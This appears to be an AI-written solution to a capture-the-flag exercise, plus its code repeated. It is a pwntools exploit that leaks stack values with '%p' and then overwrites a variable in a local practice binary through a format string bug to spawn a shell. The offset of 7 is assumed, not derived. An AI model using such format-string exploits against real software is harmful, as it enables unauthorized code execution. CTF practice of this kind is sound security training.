("To solve this challenge, we'll exploit a format string vulnerability to "
 'overwrite the value of the variable `x` with `4`. Since the binary is not '
 'PIE (Position Independent Executable) and the symbols are available, we can '
 "easily locate the address of `x`. We'll use the `pwntools` library to create "
 'an exploit that sends a crafted format string to overwrite `x` and spawn a '
 'shell.\n'
 '\n'
 '**Imports:**\n'
 '\n'
 '```python\n'
 'from pwn import *\n'
 '```\n'
 '\n'
 '**Exploit Code:**\n'
 '\n'
 '```python\n'
 'from pwn import *\n'
 '\n'
 '# Load the ELF binary\n'
 "elf = ELF('./pwn/string/fmt-1/fmt1')\n"
 '\n'
 "# Get the address of the variable 'x'\n"
 "x_addr = elf.symbols['x']\n"
 '\n'
 '# Start the process\n'
 "p = process('./pwn/string/fmt-1/fmt1')\n"
 '\n'
 '# Optional: Uncomment the following line if you need to debug\n'
 "# gdb.attach(p, gdbscript='b *main')\n"
 '\n'
 '# Determine the format string offset\n'
 '# Send a format string to leak stack addresses\n'
 "p.sendline('%p ' * 10)\n"
 'leaks = p.recvline().decode().strip().split()\n'
 'for i, leak in enumerate(leaks):\n'
 "    print(f'Position {i}: {leak}')\n"
 '\n'
 '# From the output, determine the correct offset where our input is placed\n'
 "# For this example, let's assume the offset is 7\n"
 'offset = 7\n'
 '\n'
 '# Create the payload to write the value 4 to x_addr\n'
 'payload = fmtstr_payload(offset, {x_addr: 4})\n'
 '\n'
 '# Send the payload\n'
 'p.sendline(payload)\n'
 '\n'
 '# Interact with the shell\n'
 'p.interactive()\n'
 '```\n'
 '\n'
 '**Explanation:**\n'
 '\n'
 '1. **Load the Binary and Symbols:**\n'
 '   - We load the binary using `ELF` from `pwntools` and extract the address '
 'of `x`.\n'
 '\n'
 '2. **Start the Process:**\n'
 '   - We launch the process that we want to exploit.\n'
 '\n'
 '3. **Determine the Format String Offset:**\n'
 '   - We send `%p` multiple times to print out stack addresses.\n'
 '   - By analyzing the output, we find the offset where our input is on the '
 'stack.\n'
 '   - In this code, we assume the offset is `7` based on the analysis.\n'
 '\n'
 '4. **Create the Payload:**\n'
 '   - We use `fmtstr_payload` from `pwntools` to create a format string that '
 'writes the value `4` to `x_addr`.\n'
 '\n'
 '5. **Send the Payload and Get a Shell:**\n'
 '   - We send the crafted payload to the process.\n'
 '   - If successful, the program will execute `system("/bin/sh")`, and we '
 'gain a shell.\n'
 '   - We use `p.interactive()` to interact with the spawned shell.\n'
 '\n'
 '**Notes:**\n'
 '\n'
 '- Ensure that `pwntools` is installed in your environment (`pip install '
 'pwntools`).\n'
 '- Adjust the offset if necessary based on the actual output from the target '
 'binary.\n'
 '- This exploit assumes that the target machine has the same architecture and '
 "environment as the one where you're running the exploit.")

from pwn import *

# Load the ELF binary
elf = ELF('./pwn/string/fmt-1/fmt1')

# Get the address of the variable 'x'
x_addr = elf.symbols['x']

# Start the process
p = process('./pwn/string/fmt-1/fmt1')

# Optional: Uncomment the following line if you need to debug
# gdb.attach(p, gdbscript='b *main')

# Determine the format string offset
# Send a format string to leak stack addresses
p.sendline('%p ' * 10)
leaks = p.recvline().decode().strip().split()
for i, leak in enumerate(leaks):
    print(f'Position {i}: {leak}')

# From the output, determine the correct offset where our input is placed
# For this example, let's assume the offset is 7
offset = 7

# Create the payload to write the value 4 to x_addr
payload = fmtstr_payload(offset, {x_addr: 4})

# Send the payload
p.sendline(payload)

# Interact with the shell
p.interactive()